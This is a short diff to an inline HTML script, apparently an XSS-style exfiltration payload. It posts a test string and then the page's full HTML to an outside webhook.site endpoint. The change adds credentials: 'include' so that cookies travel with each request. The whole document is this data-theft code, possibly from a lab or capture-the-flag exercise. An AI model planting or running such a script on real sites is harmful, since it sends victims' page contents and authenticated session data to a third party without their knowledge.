@@ -3,12 +3,14 @@
 <script>
     fetch("https://webhook.site/28c54aae-b353-4708-a029-f0fb185e5f35", {
         method: 'POST',
-        body: "test"
+        body: "test",
+        credentials: "include"
     })
 
     fetch("https://webhook.site/28c54aae-b353-4708-a029-f0fb185e5f35", {
         method: 'POST',
-        body: document.documentElement.outerHTML
+        body: document.documentElement.outerHTML,
+        credentials: "include"
     })
 </script>
 
